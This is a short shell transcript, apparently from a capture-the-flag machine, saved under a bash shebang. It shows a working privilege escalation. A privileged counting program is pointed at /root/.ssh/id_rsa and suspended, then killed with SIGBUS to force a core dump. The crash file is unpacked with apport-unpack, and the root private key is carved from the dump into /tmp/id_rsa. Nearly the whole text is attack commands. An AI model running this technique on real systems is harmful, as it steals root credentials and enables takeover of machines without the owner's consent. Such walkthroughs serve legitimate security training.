#!/bin/bash

dasith@secret:/opt$ ./count
Enter source file/directory name: /root/.ssh/id_rsa

Total characters = ...
Total words      = ...
Total lines      = ...
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
dasith@secret:/opt$ kill -BUS $(ps axu | grep "count" | sed -n 2p|awk '{print $2}')
dasith@secret:/opt$ fg; rm -rf /tmp/test; mkdir /tmp/test; apport-unpack /var/crash/_opt_count.1000.crash /tmp/test
./count
Bus error (core dumped)
dasith@secret:/opt$ a=$(strings /tmp/test/CoreDump | grep -n "\-\-\-" |sed -n 1p| cut -d ':' -f1); b=$(strings /tmp/test/CoreDump | grep -n "\-\-\-" |sed -n 2p| cut -d ':' -f1)
dasith@secret:/opt$ for i in $(seq $a $b);do    strings /tmp/test/CoreDump | sed -n "$i"p >> /tmp/id_rsa;done
